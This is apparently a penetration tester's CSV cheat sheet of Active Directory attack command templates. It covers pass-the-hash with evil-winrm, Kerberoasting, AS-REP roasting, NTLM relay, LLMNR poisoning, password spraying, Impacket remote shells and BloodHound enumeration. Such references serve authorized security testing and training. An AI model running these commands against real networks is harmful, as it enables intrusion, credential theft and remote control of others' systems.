"Command","Cmd","Page","Tags"
"Evil-WinRm - Pass The Hash","evil-winrm -i [IP] -u [USER] -H [HASH]","","Authenticated, Evil-WinRm, Pass The Hash"
"SMBMap - Enumerate shares","smbmap -H [IP] -u '[USER]' -p '[PASSWORD]'","","Enumeration, SMBMap, Authenticated, SMB"
"SMBClient - Access share","smbclient -U ‘[DOMAIN]/[USER]’ --password ‘[PASSWORD]’ -L \\\\[IP]\\C$","","SMBClient, Authenticated, SMB"
"SMBClient - List shares","smbclient -U ""[DOMAIN]/[USER]"" --password ""[PASSWORD]"" -L [IP]","","SMBClient, Authenticated, SMB"
"Impacket - Kerberosting","impacket-GetUserSPNs [DOMAIN]/[USER]:[PASS] -dc-ip [IP] -request","","Kerberosting, Impacket, Authenticated"
"WMIExec - No tan ruidoso","impacket-wmiexec [DOMAIN]/[USER]:[PASSWORD]@[IP]","","WMIExec, Interactive Shell, Impacket, Authenticated"
"SMBExec - No tan ruidoso","impacket-smbexec [DOMAIN]/[USER]:[PASSWORD]@[IP]","","SMBExec, Impacket, Interactive Shell, Authenticated"
"PsExec - Ruidoso, intentar múltiples veces.","impacket-psexec [DOMAIN]/[USER]:[PASSWORD]@[IP]","","PsExec, Impacket, Interactive Shell, Authenticated"
"Impacket - SMBRelay","impacket-ntlmrelayx -tf targets.txt -smb2support","","SMBRelay, Impacket, Unauthenticated"
"Responder - LLMNR Poisoning","responder -I Tun0 -rdw","","Responder, LLMNR Poisoning, Unauthenticated"
"Impacket - GetNPUsers AS RepRosting","impacket-GetNPUsers -dc-ip [IP] [DOMAIN]/[USER]","","AS-REP Rosting, Enumeration, Unauthenticated, Impacket"
"Kerbrute - Password Spraying","kerbrute passwordspray --dc [IP] -d [DOMAIN] ./[USER_WORDLIST_PATH] '[PASSWORD]'","","Password Spraying, Kerbrute, Unauthenticated"
"Netexec - Password Spraying","netexec smb [IP/DOMAIN] -u [USER_WORDLIST_PATH] -p [PASSWORD]","","Crackmapexec, Netexec, Password Spraying, Brute-Forcing, Unauthenticated"
"BloodHound - Make all Digest","bloodhound-ce-python -d [DOMAIN] -u [USER] -p [PASSWORD] -gc [DOMAIN] -c ALL -ns [DCIP]","","BloodHound, Enumeration, Authenticated"
"Netexec - Enumerate Users via SMB","netexec smb [IP/DOMAIN] -u [USER] -p [PASSWORD] --users | awk '{print $5}'","","Authenticated, Crackmapexec, Netexec, Enumeration, User Enumeration"
"TEMPLATE TAGS","Enter page to see all Tags","",""
"Enum4Linux - Authenticated Enumeration","enum4linux -a -u [USER] -p [PASSWORD] [IP/DOMAIN]","","Authenticated, Enum4Linux, Enumeration"
"Enum4Linux - Unauthenticated Enumeration","enum4Linux -a [IP/DOMAIN]","","Enum4Linux, Enumeration, Unauthenticated"
